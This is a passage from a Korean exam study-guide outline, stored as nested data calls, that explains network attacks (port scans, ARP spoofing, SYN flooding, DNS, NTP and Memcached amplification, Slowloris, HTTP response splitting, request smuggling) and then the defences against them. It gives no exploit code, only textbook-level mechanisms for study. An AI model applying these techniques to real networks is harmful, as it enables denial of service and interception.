  n("s2c2","2장 네트워크 기반 공격",["1장에서 정리한 정상 동작이 실제로 어떻게 악용되는지 보는 장으로, 공격 이름과 동작 원리를 짝지어 묻는 문제가 많다.","2장은 정찰, 엿보기·위장, 서비스 거부, HTTP 규칙 악용의 순서로 네트워크 기반 공격을 다룬다."],[
   n("scan","포트 스캔",["공격자는 공격하기 전에 어떤 서비스가 열려 있는지부터 확인하므로, 포트 스캔은 대부분의 공격이 시작되는 첫 단계이다.","포트 스캔은 공격 전에 대상의 열린 포트를 확인하는 정찰 활동이다.","3-Way Handshake를 어디까지 진행하는지에 따라 스캔 방식을 구분한다."],[
    n("open","TCP Open Scan",["가장 확실하게 열린 포트를 확인하는 방식이지만 흔적이 남는다는 점이 다른 스캔과 구분되는 핵심이다.","TCP Open Scan은 SYN, SYN+ACK, ACK의 순서로 연결을 끝까지 맺어 포트가 열렸는지 확인하는 방식이다.","연결이 완성되므로 로그가 남는다."]),
    n("half","Half-Open Scan",["연결을 끝까지 맺지 않아 흔적을 줄일 수 있기 때문에 공격자가 즐겨 쓰는 방식이다.","Half-Open Scan은 SYN을 보낸 뒤 SYN+ACK를 받으면 RST를 보내 바로 끊는 방식이다.","연결이 완성되지 않으므로 로그가 남지 않는다.","닫힌 포트는 RST+ACK로 응답하며, 아무 응답이 없으면 방화벽이 걸러 내고 있을 가능성이 있다."],[],1),
    n("stealth","스텔스 스캔",["정상적인 연결 요청이 아닌 패킷을 보내 탐지를 피하는 방식이므로, 열린 포트와 닫힌 포트의 응답 차이를 정확히 기억해야 한다.","스텔스 스캔은 연결을 맺지 않고 비정상적인 플래그 조합의 패킷을 보내 응답으로 포트 상태를 알아내는 방식이다.","닫힌 포트는 RST로 응답하고, 열린 포트는 응답하지 않는다."],[
     n("fin","FIN Scan",["스텔스 스캔의 종류는 어떤 플래그를 켜는지로 구분되므로, 각 스캔의 플래그 조합을 정확히 기억해야 한다.","FIN Scan은 FIN 플래그만 켠 패킷을 보내는 스텔스 스캔이다."]),
     n("null","NULL Scan",["스텔스 스캔의 종류는 어떤 플래그를 켜는지로 구분되므로, 각 스캔의 플래그 조합을 정확히 기억해야 한다.","NULL Scan은 모든 플래그를 끈 패킷을 보내는 스텔스 스캔이다."]),
     n("xmas","Xmas Scan",["스텔스 스캔의 종류는 어떤 플래그를 켜는지로 구분되므로, 각 스캔의 플래그 조합을 정확히 기억해야 한다.","Xmas Scan은 FIN, URG, PSH 플래그를 켠 패킷을 보내는 스텔스 스캔이다."])
    ],1)
   ]),
   n("sniff","스니핑 · 스푸핑 · 탈취",["TCP/IP는 주소와 순서 번호만 확인하고 내용을 암호화하지 않기 때문에, 남의 데이터를 엿보거나 남으로 위장하는 공격이 가능해진다.","이 묶음은 남의 데이터를 엿보거나(스니핑), 남으로 위장하거나(스푸핑), 남의 연결을 빼앗는(탈취) 공격을 다룬다."],[
    n("jamming","Switch Jamming",["정상적인 스위치는 목적지 포트로만 프레임을 보내 다른 사람이 엿볼 수 없지만, 이 공격은 스위치를 허브처럼 바꿔 스니핑을 가능하게 만든다.","Switch Jamming은 가짜 MAC 주소를 대량으로 보내 스위치의 MAC 주소 테이블을 가득 채우는 공격이다.","테이블이 가득 차면 스위치가 목적지를 찾지 못해 더미 허브처럼 모든 포트로 프레임을 전달하게 된다.","MAC Flooding이라고도 부른다."],[],1),
    n("arpspoof","ARP 스푸핑",["정상적인 ARP는 응답을 그대로 믿고 캐시 테이블에 저장하는데, 이 공격은 그 점을 악용해 피해자의 통신이 공격자를 거치도록 만든다.","ARP 스푸핑은 위조한 ARP Reply를 계속 보내, 피해자의 ARP 캐시 테이블에서 특정 호스트의 MAC 주소를 공격자의 MAC 주소로 바꾸는 공격이다.","대응 방법은 `arp -s [IP] [MAC]` 명령으로 정적 ARP를 설정하는 것이다.","답안에 쓸 때 철자를 APR이 아니라 ARP로 정확히 써야 한다."],[],1),
    n("hijack","세션 하이재킹",["정상적인 TCP 연결은 SEQ·ACK 번호로만 상대를 확인하기 때문에, 번호를 알아내면 인증 없이 남의 연결을 차지할 수 있다.","세션 하이재킹은 시퀀스 번호를 알아낸 뒤 RST로 기존 연결을 끊고, 새 번호로 연결을 가로채는 공격이다.","이 공격으로 공격자는 인증 절차 없이 세션을 차지한다."],[],1)
   ]),
   n("dos","서비스 거부",["정보보안의 세 요소 가운데 가용성을 직접 침해하는 공격이므로, 종류별 원리를 구분해서 알아야 한다.","서비스 거부는 서비스를 정상적으로 쓰지 못하게 만드는 공격으로, 가용성을 침해한다."],[
    n("exhaust","자원 고갈",["서버는 한 번에 처리할 수 있는 자원이 정해져 있으므로, 그 자원을 다 써 버리게 만들면 정상 사용자가 서비스를 받지 못한다.","자원 고갈 공격은 서버의 연결 대기열 같은 자원을 가득 채워 서비스를 막는 공격이다."],[
     n("synflood","SYN Flooding",["정상적인 3-Way Handshake에서 서버는 SYN을 받으면 ACK가 올 때까지 연결을 대기열에 잡아 두는데, 이 공격은 그 점을 악용한다.","SYN Flooding은 SYN만 계속 보내고 ACK는 보내지 않아 서버의 연결 대기열을 가득 채우는 공격이다.","답안을 쓸 때 SYN이라는 단어를 꼭 넣어야 한다."],[],1)
    ]),
    n("malformed","비정상 패킷",["시스템은 정상 형식의 패킷을 전제로 만들어져 있으므로, 형식이 어긋난 패킷을 받으면 오류를 일으킬 수 있다.","비정상 패킷 공격은 정상적으로 처리할 수 없는 패킷을 보내 시스템에 오류를 일으키는 서비스 거부 공격이다."],[
     n("land","Land Attack",["Land Attack은 패킷 헤더를 조금만 조작해도 시스템이 스스로 무너질 수 있다는 것을 보여 주는 대표적인 비정상 패킷 공격이라서 자주 출제된다.","정상적인 통신에서는 출발지 IP(보낸 쪽)와 목적지 IP(받는 쪽)가 서로 다르기 때문에, 받은 쪽은 출발지 IP로 응답을 돌려보낸다.","Land Attack은 출발지 IP와 목적지 IP를 똑같이 만들어 보내서, 대상 시스템이 자기 자신에게 계속 응답하게 만드는 공격이다."]),
     n("teardrop","Teardrop",["Teardrop은 패킷을 조각내고 다시 합치는 과정의 허점을 노리는 공격이라, 비정상 패킷 공격을 구별하는 문제에 자주 나온다.","정상적인 경우 큰 패킷은 여러 조각으로 나뉘어 전송되고, 받는 쪽은 각 조각의 Fragment Offset(원래 패킷에서의 위치 값)을 보고 순서대로 다시 조립한다.","Teardrop은 이 Fragment Offset 값을 서로 겹치게 조작해서, 받는 쪽이 재조립하는 과정에서 오류를 일으키게 만드는 공격이다."])
    ]),
    n("reflect","반사 · 증폭",["반사·증폭 공격은 공격자가 적은 자원으로 피해자에게 엄청난 양의 트래픽을 보낼 수 있게 해 주기 때문에 대규모 DDoS의 주된 방법이 되고, 시험에서도 여러 프로토콜별로 출제된다.","정상적인 통신에서 서버는 요청을 보낸 출발지 IP로 응답을 돌려보낸다. 반사 공격은 출발지 IP를 피해자 IP로 위조해서, 제3자 서버들의 응답이 피해자에게 몰리게 만드는 방식이다.","증폭은 작은 요청에 큰 응답을 돌려주는 서비스를 악용해, 공격자가 보낸 양보다 훨씬 많은 트래픽이 피해자에게 가게 만드는 것이다.","이 공격에 쓰이는 프로토콜은 모두 UDP이거나 ICMP라는 공통점이 있다. UDP는 연결을 확인하는 절차가 없어서 출발지 IP를 위조하기 쉽기 때문이다."],[
     n("smurf","Smurf",["Smurf는 반사·증폭 공격의 원조 격인 공격이고, 이름이 비슷한 다른 공격과 헷갈리게 내는 문제가 많아서 정확히 구별해 두어야 한다.","정상적인 ping은 ICMP Echo Request를 보내면 받은 호스트가 보낸 사람에게 Echo Reply를 돌려주는 방식으로 동작한다.","Smurf는 출발지를 피해자 IP로 위조한 ICMP Echo Request를 Directed Broadcast(특정 네트워크 전체에 보내는 브로드캐스트)로 보내는 공격이다.","그러면 그 네트워크에 있는 여러 호스트가 모두 Echo Reply를 보내고, 이 응답이 한꺼번에 피해자에게 몰린다.","출발지와 목적지를 같게 만드는 Land Attack과 혼동하지 않도록 주의한다."],[],1),
     n("dnsamp","DNS 증폭 (DNS Amplification) · UDP 53",["DNS는 인터넷 어디에나 있는 서비스라서 증폭기로 악용되기 쉽고, 오픈 리졸버와 대응 방법까지 묶어서 출제되는 경우가 많다.","정상적인 경우 DNS 서버는 질의를 보낸 출발지 IP로 응답을 돌려준다. DNS 증폭(DNS Amplification)은 UDP 53 포트를 사용하는 이 동작을 악용하는 반사·증폭 공격이다.","공격자는 출발지를 피해자 IP로 위조한 뒤, DNS 서버에 ANY처럼 큰 응답이 나오는 질의를 보낸다. 그러면 작은 질의 하나가 수십 배 큰 응답이 되어 피해자에게 몰린다.","주로 악용되는 대상은 아무 질의에나 답해 주는 오픈 리졸버(공개 DNS 서버)이다.","대응 방법은 외부에서 오는 재귀 질의를 차단하고, 응답 크기를 제한하는 것이다."]),
     n("ntp","NTP (Network Time Protocol) · UDP 123",["NTP 증폭은 시간을 맞추는 평범한 서비스도 DDoS 증폭기로 악용될 수 있다는 예로, 악용되는 명령과 대응 설정이 함께 출제된다.","NTP(Network Time Protocol)는 UDP 123 포트를 사용해 컴퓨터의 시간을 맞추는 프로토콜이다.","NTP 증폭 공격은 최근 접속자 목록을 최대 600개까지 응답해 주는 `monlist` 명령을 악용한다. 작은 요청 하나로 큰 응답을 받아 피해자에게 보내게 하는 것이다.","대응 방법은 NTP 버전을 업그레이드하거나 `disable monitor` 설정으로 monlist 기능을 끄는 것이다."],[],1),
     n("ssdp","SSDP (Simple Service Discovery Protocol) · UDP 1900",["SSDP 증폭은 공유기·IoT 기기처럼 집집마다 있는 장비가 증폭기로 악용될 수 있다는 점에서 반사·증폭 공격의 대표 사례로 함께 외워 둔다.","SSDP(Simple Service Discovery Protocol)는 UDP 1900 포트를 사용해 네트워크 안의 장치를 찾는 프로토콜이다.","SSDP 증폭 공격은 `ssdp:all` 검색 요청을 악용하며, 최대 30배까지 증폭된다."],[],1),
     n("memcached","Memcached · UDP 11211",["Memcached 증폭은 증폭 배수가 매우 커서 역대급 DDoS에 쓰인 사례로 알려져 있으므로, 포트 번호와 배수를 함께 기억해 두는 것이 좋다.","Memcached 증폭 공격은 UDP 11211 포트로 동작하는 Memcached 서비스를 악용하는 반사·증폭 공격이며, 최대 51,000배까지 증폭된다.","대응 방법은 외부에서 들어오는 응답 중 출발지 포트가 11211인 트래픽을 차단하는 것이다."],[],1)
    ],1),
    n("slow","Slow DoS",["Slow DoS는 트래픽 양이 적고 정상 요청처럼 보이기 때문에, 대량 트래픽을 감시하는 일반적인 DDoS 방어로는 잡기 어렵다는 점이 중요하다.","Slow DoS는 정상 사용자처럼 보이게 아주 느리게 통신하면서 서버와의 연결을 오래 붙잡아, 서버가 새 연결을 받지 못하게 만드는 공격이다."],[
     n("slowloris","Slowloris",["Slowloris는 Slow DoS 가운데 가장 대표적인 공격으로, HTTP 헤더의 끝을 판단하는 방식을 알아야 이해할 수 있어 자주 출제된다.","정상적인 HTTP 요청은 헤더가 끝났다는 표시로 빈 줄(`0D0A0D0A`, 즉 CR LF CR LF)을 보내고, 서버는 이 표시를 받아야 요청 처리를 시작한다.","Slowloris는 이 헤더 끝 표시(`0D0A0D0A`)를 보내지 않고 헤더를 조금씩 계속 보내서, 서버가 연결을 끊지 못하고 계속 붙잡고 있게 만드는 공격이다.","다른 이름으로 Slow HTTP Header DoS라고도 한다."],[],1),
     n("rudy","RUDY (R-U-Dead-Yet)",["RUDY는 Slowloris와 함께 Slow DoS의 대표 공격으로, 헤더를 노리는지 본문을 노리는지로 둘을 구별하는 문제가 나온다.","정상적인 POST 요청은 헤더에 본문 길이를 알리고 그만큼의 요청 본문(Body)을 바로 보낸다.","RUDY(R-U-Dead-Yet)는 요청 본문(Body)을 아주 천천히 조금씩 보내서 서버가 연결을 계속 붙잡고 기다리게 만드는 공격이다.","다른 이름으로 Slow HTTP POST라고도 한다."]),
     n("slowread","Slow Read",["Slow Read는 요청을 느리게 보내는 다른 Slow DoS와 달리 응답을 느리게 받는 방식이라, 구별 문제에서 헷갈리지 않도록 정리해 둔다.","정상적인 TCP 통신에서 받는 쪽은 윈도우 크기로 한 번에 받을 수 있는 양을 알려 주고, 보내는 쪽은 그만큼씩 데이터를 보낸다.","Slow Read는 TCP 윈도우 크기를 아주 작게 설정해서 서버의 응답을 아주 천천히 받는 공격이다. 그 결과 서버는 응답을 다 보내지 못한 채 연결을 오래 붙잡게 된다."],[],1)
    ])
   ]),
   n("httpabuse","HTTP 규칙 악용",["HTTP는 텍스트 규칙으로 메시지의 경계를 정하기 때문에, 이 규칙을 속이면 응답을 위조하거나 다른 사용자의 요청에 끼어들 수 있다. 그래서 이 영역의 공격이 출제된다.","이 영역은 HTTP가 헤더와 본문의 끝을 판단하는 방식을 속이는 공격을 다루며, HTTP 응답 분할과 Request Smuggling이 여기에 속한다."],[
    n("split","HTTP 응답 분할",["HTTP 응답 분할은 사용자 입력이 응답 헤더에 그대로 들어갈 때 생기는 취약점으로, 공격 원리와 대응 방법이 함께 출제된다.","정상적인 HTTP 응답은 헤더 줄 끝마다 CR·LF로 줄을 바꾸고, 빈 줄이 나오면 헤더가 끝났다고 판단한다.","HTTP 응답 분할은 입력값에 CR(`%0D`)과 LF(`%0A`)를 넣어서 응답 헤더를 일찍 끝내 버리고, 그 뒤에 공격자가 만든 내용을 붙여 응답을 둘로 나누는 공격이다.","대응 방법은 입력값에서 CR·LF 문자를 제거하는 것이다."],[],1),
    n("smuggle","Request Smuggling",["요즘 웹 서비스는 프록시·로드밸런서 같은 프론트엔드 서버 뒤에 백엔드 서버를 두는 구조가 많아서, 두 서버의 해석 차이를 노리는 Request Smuggling이 중요한 공격이 되었다.","정상적인 경우 프론트엔드 서버와 백엔드 서버는 요청이 어디서 끝나는지를 똑같이 판단하고, 요청을 하나씩 차례로 처리한다.","Request Smuggling은 프론트엔드와 백엔드 서버가 요청의 끝을 서로 다르게 판단하는 점을 악용하는 공격이다.","한쪽이 처리하지 않고 남긴 부분이 다음 사용자 요청 앞에 붙어 버려서, 다른 사용자의 요청을 공격자가 조작할 수 있게 된다.","대응 방법은 서버 간 해석 기준을 통일하고, Content-Length와 Transfer-Encoding 두 헤더가 함께 있는 요청을 거부하며, HTTP/2를 사용하는 것이다."],[
     n("cl_te","CL.TE (Content-Length · Transfer-Encoding)",["Request Smuggling은 두 서버가 어떤 헤더로 끝을 판단하는지에 따라 유형이 나뉘므로, 유형 이름의 앞뒤가 무엇을 뜻하는지 알아 두어야 한다.","CL.TE는 프론트엔드 서버는 Content-Length 헤더로, 백엔드 서버는 Transfer-Encoding: chunked 방식으로 요청의 끝을 판단하는 경우이다."]),
     n("te_cl","TE.CL (Transfer-Encoding · Content-Length)",["TE.CL은 CL.TE와 순서만 반대인 유형이라, 이름의 앞이 프론트엔드, 뒤가 백엔드라는 규칙을 기억하면 헷갈리지 않는다.","TE.CL은 프론트엔드 서버는 Transfer-Encoding: chunked 방식으로, 백엔드 서버는 Content-Length 헤더로 요청의 끝을 판단하는 경우이다."]),
     n("te_te","TE.TE (Transfer-Encoding · Transfer-Encoding)",["TE.TE는 두 서버가 같은 방식을 지원해도 공격이 가능하다는 점을 보여 주는 유형이라 따로 정리해 둔다.","TE.TE는 프론트엔드와 백엔드 서버가 둘 다 chunked 방식을 지원하지만, 공격자가 Transfer-Encoding 헤더를 변형해서 한쪽 서버만 chunked를 무시하게 만드는 경우이다."])
    ],1)
   ]),
   n("dga","DGA (Domain Generation Algorithm)",["악성코드가 고정된 C&C 서버 주소를 쓰면 그 주소만 막으면 되지만, DGA를 쓰면 주소가 계속 바뀌어 차단이 어려워진다. 그래서 2과목 18회에 기출로 출제되었다.","DGA(Domain Generation Algorithm)는 악성코드와 C&C 서버가 같은 알고리즘과 같은 시드값을 사용해 매일 도메인을 수천 개씩 만들어 내는 기법이다.","방어하는 쪽이 도메인 하나를 차단해도, 악성코드는 같은 규칙으로 만든 다른 도메인으로 접속한다.","보기에 봇넷이 함께 나오면 주의한다. 봇넷은 감염된 PC 무리를 뜻하므로 이 문제의 답이 아니다."],[],1)
  ]),
  n("s2c3","3장 네트워크 보안 기술",["2장에서 배운 네트워크 공격을 실제로 어떻게 막는지 알아야 서술형 대응 문제를 쓸 수 있으므로, 이 장은 방어 쪽 지식의 중심이 된다.","3장은 공격을 막는 보안 장비(IDS, IPS, NAC, ESM, SIEM, SOAR, TMS 등)와 통신을 보호하는 암호화 프로토콜(SSL/TLS, IPSec, VPN, 무선 보안, E2EE)을 다룬다."],[
   n("ids","보안 장비",["보안 장비는 이름이 비슷해서 헷갈리기 쉽고, 시험에서는 설명을 보고 장비 이름을 쓰게 하는 문제가 많다.","장비마다 핵심 동작(탐지, 차단, 관리, 분석, 대응, 경보)이 다르므로, 이 핵심 동작을 기준으로 구별하면 된다."],[
    n("detect","탐지 · 차단",["공격을 찾아내는 것과 막는 것은 서로 다른 기능이라, 어떤 장비가 어디까지 하는지를 구별하는 문제가 자주 나온다.","이 분류는 공격을 찾아내거나(탐지) 막는(차단) 장비를 다루며, IDS의 탐지 방식과 설치 위치, 오탐·미탐, IPS, NAC가 여기에 속한다."],[
     n("idsmodel","IDS (Intrusion Detection System) 탐지 방식",["IDS가 어떤 기준으로 공격을 판단하는지에 따라 잡을 수 있는 공격과 오탐 정도가 달라지기 때문에, 탐지 방식의 장단점이 자주 출제된다.","IDS(Intrusion Detection System)는 침입을 탐지만 하고 차단하지는 않는 장비이다.","탐지 방식은 알려진 패턴과 비교하는 오용 탐지와, 평소와 다른 행동을 찾는 이상 탐지로 나뉜다."],[
      n("misuse","오용 탐지",["오용 탐지와 이상 탐지는 장단점이 정반대라서, 둘을 비교하는 문제가 자주 나온다.","오용 탐지는 들어온 트래픽이나 행위를 이미 알려진 공격 패턴(시그니처)과 비교해서 공격인지 판단하는 방식이다.","알려진 패턴과 일치할 때만 경보를 내므로 오탐이 적지만, 패턴이 등록되지 않은 새로운 공격은 잡지 못한다."]),
      n("anomaly","이상 탐지",["이상 탐지는 시그니처가 없는 새로운 공격까지 잡을 수 있다는 점에서 오용 탐지의 약점을 보완하는 방식이라, 둘을 비교하는 문제에 함께 나온다.","이상 탐지는 평소의 정상적인 행동을 기준으로 삼고, 그와 다른 행동을 찾아내서 공격으로 판단하는 방식이다.","새로운 공격도 잡을 수 있지만, 평소와 조금만 달라도 경보를 내기 때문에 오탐이 많다."])
     ],1),
     n("fpfn","오탐 · 미탐",["탐지 장비의 성능을 평가하거나 탐지 방식의 장단점을 설명할 때 반드시 쓰이는 개념이라 용어를 정확히 구별해야 한다.","오탐과 미탐은 탐지 결과가 틀리는 두 가지 경우를 말한다."],[
      n("fp","오탐 (False Positive)",["오탐이 많으면 관리자가 쓸데없는 경보를 확인하느라 시간을 낭비하고, 진짜 공격을 놓치기 쉬워진다.","오탐(False Positive)은 정상적인 트래픽이나 행위를 공격으로 잘못 판단하는 경우이다."]),
      n("fn","미탐 (False Negative)",["미탐은 실제 공격이 아무 경보 없이 통과하는 것이라, 오탐보다 피해가 직접적일 수 있다.","미탐(False Negative)은 실제 공격을 정상으로 잘못 판단해서 놓치는 경우이다."])
     ]),
     n("hidsnids","설치 위치",["IDS를 어디에 설치하느냐에 따라 볼 수 있는 정보와 한계가 달라지므로, HIDS와 NIDS를 비교하는 문제가 나온다.","이 분류는 IDS를 설치하는 위치에 따라 서버에 설치하는 HIDS와 네트워크에 설치하는 NIDS로 나눈다."],[
      n("hids","HIDS (Host-based IDS)",["HIDS는 서버 안에서 일어나는 일을 직접 볼 수 있어서, 네트워크 장비로는 알기 어려운 침입 흔적을 잡는 데 쓰인다.","HIDS(Host-based IDS)는 서버(호스트)에 직접 설치하는 침입 탐지 시스템이다.","서버의 로그와 파일 무결성(파일이 변조되지 않았는지)을 확인해서 침입을 탐지한다."]),
      n("nids","NIDS (Network-based IDS)",["NIDS는 네트워크 전체를 지나가는 트래픽을 한곳에서 감시할 수 있지만 한계도 분명해서, HIDS와 비교하는 문제에 자주 나온다.","NIDS(Network-based IDS)는 네트워크에 설치하는 침입 탐지 시스템이다.","지나가는 패킷을 분석해서 탐지하지만, 암호화된 패킷의 내용은 볼 수 없다."])
     ],1),
     n("ips","IPS (Intrusion Prevention System)",["IDS는 탐지만 하기 때문에 관리자가 직접 조치해야 하는데, 공격을 실시간으로 막으려면 차단 기능이 필요하다. 그래서 IDS와 IPS의 차이가 자주 출제된다.","IPS(Intrusion Prevention System)는 침입을 탐지하는 데서 끝나지 않고 차단까지 하는 장비이다."]),
     n("nac","NAC (Network Access Control)",["감염된 노트북이나 허가받지 않은 기기가 내부망에 접속하면 내부 전체가 위험해지므로, 접속하는 순간에 기기를 검사하는 장치가 필요하다.","NAC(Network Access Control)는 기기가 네트워크에 접속하기 전에 검사해서, 허가되지 않았거나 감염된 기기를 차단하는 장비이다.","대표적인 예로 오픈소스인 PacketFence가 있다."],[],1)
    ]),
    n("integ","통합 관리 · 분석",["보안 장비가 많아질수록 각 장비의 경보를 따로 보기 어려워지므로, 정보를 한곳에 모아 관리하고 분석하는 시스템이 필요하다.","이 분류는 여러 장비의 정보를 모아 관리하고 대응하는 시스템을 다루며, ESM, SIEM, SOAR, TMS가 여기에 속한다."],[
     n("esm","ESM (Enterprise Security Management)",["방화벽, IDS, IPS 같은 장비를 각각 따로 관리하면 전체 상황을 파악하기 어렵기 때문에 통합 관리가 필요하다.","ESM(Enterprise Security Management)은 여러 보안 장비를 한곳에서 통합 관리하는 시스템이다.","구성요소는 Agent, Manager, Console이다."]),
     n("siem","SIEM (Security Information and Event Management)",["ESM이 보안 장비 위주로 관리한다면, SIEM은 더 많은 로그를 모아 분석하기 때문에 둘의 차이를 묻는 문제가 나온다.","SIEM(Security Information and Event Management)은 모든 로그를 빅데이터로 모아 서로 연관 지어 분석하는 시스템이다.","주요 기능은 수집, 분류, 변환, 분석이다."],[],1),
     n("soar","SOAR (Security Orchestration, Automation and Response)",["탐지되는 위협이 너무 많아 사람이 하나하나 대응하기 어렵기 때문에, 대응을 자동화하는 SOAR가 등장했다.","SOAR(Security Orchestration, Automation and Response)는 탐지된 위협에 자동으로 대응하는 시스템이다.","이름은 Orchestration, Automation, Response의 줄임말이며, 미리 정해 둔 대응 시나리오를 플레이북이라고 한다. 문제에 '플레이북'이라는 표현이 나오면 SOAR를 떠올리면 된다."],[],1),
     n("tms","TMS (Threat Management System)",["공격이 들어온 뒤에 대응하는 것보다 미리 위협을 알고 대비하는 것이 낫기 때문에, 외부 위협 정보를 모아 경보하는 장비가 쓰인다.","TMS(Threat Management System)는 외부 위협 정보를 모아서 미리 경보하는 시스템이다."],[],1)
    ])
   ]),
   n("proto","보안 프로토콜",["스니핑(엿보기)이나 스푸핑(위장) 같은 공격을 근본적으로 막으려면 통신 내용을 암호화해야 하므로, 보안 프로토콜이 중요하다.","보안 프로토콜은 어느 계층을 보호하는지로 구분한다."],[
    n("tls","SSL/TLS (Secure Sockets Layer / Transport Layer Security)",["웹 통신 대부분이 HTTPS로 이루어지기 때문에, 그 바탕인 SSL/TLS의 구조와 동작은 시험에서 빠지지 않는다.","SSL/TLS(Secure Sockets Layer / Transport Layer Security)는 TCP 위에서 통신을 암호화하는 프로토콜이며, 기밀성, 무결성, 인증을 제공한다.","HTTPS의 S가 바로 이 SSL/TLS를 뜻한다."],[
     n("tlsup","상위 프로토콜",["SSL/TLS는 여러 하위 프로토콜로 이루어져 있어서, 각 프로토콜의 이름과 역할을 짝지어 묻는 문제가 나온다.","상위 프로토콜은 Record 프로토콜 위에서 동작하는 세 가지 프로토콜, 즉 Handshake, Change Cipher Spec, Alert를 말한다."],[
      n("hs","Handshake",["암호화 통신을 시작하려면 먼저 상대를 확인하고 어떤 암호 방식과 키를 쓸지 정해야 하므로, Handshake가 TLS 연결의 첫 단계가 된다.","Handshake 프로토콜은 서버와 클라이언트가 서로 인증하고, 사용할 암호 알고리즘과 키를 협상하는 프로토콜이다."]),
      n("ccs","Change Cipher Spec",["협상이 끝난 뒤 언제부터 새 암호 방식을 쓰는지 양쪽이 정확히 맞춰야 하므로, 이를 알리는 별도의 프로토콜이 있다.","Change Cipher Spec 프로토콜은 Handshake에서 협상한 암호 방식으로 이제부터 바꾼다고 상대에게 알리는 프로토콜이다."]),
      n("alert","Alert",["통신 중 문제가 생겼을 때 이를 상대에게 알리지 않으면 잘못된 상태로 통신이 계속될 수 있으므로, 경고를 전달하는 프로토콜이 필요하다.","Alert 프로토콜은 통신 중 문제가 생기면 경고나 오류를 상대에게 알리는 프로토콜이다."])
     ]),
     n("record","Record 프로토콜",["Record 프로토콜은 실제 데이터를 보호하는 처리 순서를 담고 있어서, 순서를 빈칸으로 묻는 문제가 나온다.","Record 프로토콜은 데이터를 단편화, 압축, MAC 추가, 암호화, 헤더 추가의 순서로 처리한다.","앞 글자를 따서 '단·압·맥·암'으로 외우면 쉽다."],[],1),
     n("rtt","RTT (Round Trip Time)",["TLS 버전에 따라 연결을 맺는 데 걸리는 왕복 횟수가 줄어들어 속도가 빨라졌기 때문에, 버전별 RTT 수를 묻는 문제가 나온다.","RTT(Round Trip Time)는 요청을 보내고 응답이 돌아오기까지의 한 번의 왕복을 말한다.","TLS 1.2는 2-RTT, TLS 1.3의 첫 연결은 1-RTT, TLS 1.3의 세션 재개는 0-RTT가 걸린다.","여기서 말하는 RTT는 TLS Handshake의 왕복 횟수이며, TCP 3-Way Handshake와는 다른 이야기다."],[],1),
     n("dtls","DTLS (Datagram TLS)",["TLS는 TCP 위에서만 동작하기 때문에, UDP를 쓰는 서비스도 암호화하려면 별도의 방식이 필요하다.","DTLS(Datagram TLS)는 UDP(데이터그램) 환경에서 사용하는 TLS이다."],[],1)
    ]),
    n("ipsec","IPSec (IP Security)",["IPSec은 IP 계층에서 보호하기 때문에 그 위의 어떤 응용 프로그램이든 따로 수정하지 않고 보호할 수 있어, VPN의 핵심 기술로 자주 출제된다.","IPSec(IP Security)은 3계층(네트워크 계층)을 보호하는 보안 프로토콜이다."],[
     n("ah","AH (Authentication Header)",["AH와 ESP는 암호화를 하느냐 마느냐로 구별하는 문제가 자주 나오므로 각 기능을 정확히 알아야 한다.","AH(Authentication Header)는 송신자 인증과 무결성만 제공하고, 암호화는 하지 않는다.","32비트 Sequence Number를 사용해 재전송 공격을 막는다."],[],1),
     n("esp","ESP (Encapsulating Security Payload)",["AH만으로는 내용이 그대로 보이므로, 내용을 숨기려면 암호화 기능이 있는 ESP가 필요하다.","ESP(Encapsulating Security Payload)는 AH의 기능(인증·무결성)에 기밀성(암호화)을 더한 프로토콜이다."],[],1),
     n("mode","동작 모드",["IPSec은 어떤 구간을 보호하느냐에 따라 쓰는 모드가 달라지므로, 두 모드의 차이를 묻는 문제가 나온다.","IPSec의 동작 모드는 무엇을 보호하는지에 따라 전송 모드와 터널 모드로 나뉜다."],[
      n("transport","전송 모드",["전송 모드는 원래 IP 헤더를 그대로 두기 때문에, 두 컴퓨터가 직접 통신할 때 쓰기에 알맞다.","전송 모드는 패킷의 페이로드(데이터 부분)만 보호하는 모드이다.","호스트와 호스트 사이에서 사용한다."]),
      n("tunnel","터널 모드",["터널 모드는 원래 IP 헤더까지 숨길 수 있어서, 지사와 본사를 잇는 VPN처럼 네트워크끼리 연결할 때 쓰인다.","터널 모드는 원래 패킷 전체를 보호하고, 그 앞에 새 IP 헤더를 붙이는 모드이다.","게이트웨이와 게이트웨이 사이에서 사용한다."])
     ]),
     n("ike","IKE (Internet Key Exchange)",["IPSec으로 암호화하려면 양쪽이 같은 키를 가지고 있어야 하므로, 키를 안전하게 나누어 갖는 절차가 필요하다.","IKE(Internet Key Exchange)는 IPSec에서 사용할 키를 교환하는 프로토콜이다."])
    ]),
    n("vpn","VPN (Virtual Private Network) 터널링",["VPN은 공용 인터넷 위에 전용선처럼 안전한 통로를 만드는 기술이라 널리 쓰이며, 시험에서는 프로토콜이 몇 계층에서 동작하는지를 자주 묻는다.","VPN(Virtual Private Network) 터널링은 계층에 따라 사용하는 프로토콜이 다르다. 2계층에는 L2F, PPTP, L2TP가 있고, 3계층에는 IPSec이 있다."],[
     n("l2f","L2F (Layer 2 Forwarding)",["2계층 VPN 프로토콜은 만든 회사와 특징으로 구별하는 문제가 나오므로 하나씩 정리해 둔다.","L2F(Layer 2 Forwarding)는 2계층에서 동작하는 VPN 프로토콜로, Cisco가 만들었고 UDP를 사용한다."]),
     n("pptp","PPTP (Point-to-Point Tunneling Protocol)",["PPTP는 L2F와 함께 L2TP의 바탕이 된 프로토콜이라, 만든 회사와 인증 방식을 함께 기억해 둔다.","PPTP(Point-to-Point Tunneling Protocol)는 2계층에서 동작하는 VPN 프로토콜로, Microsoft가 만들었고 PPP로 인증한다."]),
     n("l2tp","L2TP (Layer 2 Tunneling Protocol)",["L2TP는 앞의 두 프로토콜을 합친 것이라, '무엇과 무엇을 합쳤는가'를 묻는 문제가 나온다.","L2TP(Layer 2 Tunneling Protocol)는 2계층에서 동작하는 VPN 프로토콜로, L2F와 PPTP를 합친 것이다."]),
     n("vpnipsec","IPSec (IP Security)",["VPN 프로토콜을 계층별로 나눌 때, 2계층 프로토콜들과 구별되는 유일한 3계층 프로토콜이라 따로 기억해 둔다.","IPSec(IP Security)은 3계층에서 동작하는 VPN 프로토콜이다."])
    ],1),
    n("wifi","무선 보안",["무선 랜은 전파가 공기 중으로 퍼지기 때문에 누구나 엿들을 수 있어서, 어떤 암호화 방식을 쓰는지가 보안에 매우 중요하다.","이 분류는 무선 랜의 암호화 방식인 WEP, WPA, WPA2, WPA3를 다룬다.","WEP 기출(RC4를 빈칸으로 내는 문제)에서 MD5와 헷갈리기 쉽다. RC4는 데이터를 암호화하는 스트림 암호이고, MD5는 암호화가 아닌 해시 함수다. 둘 다 로널드 리베스트가 만들었다."],[
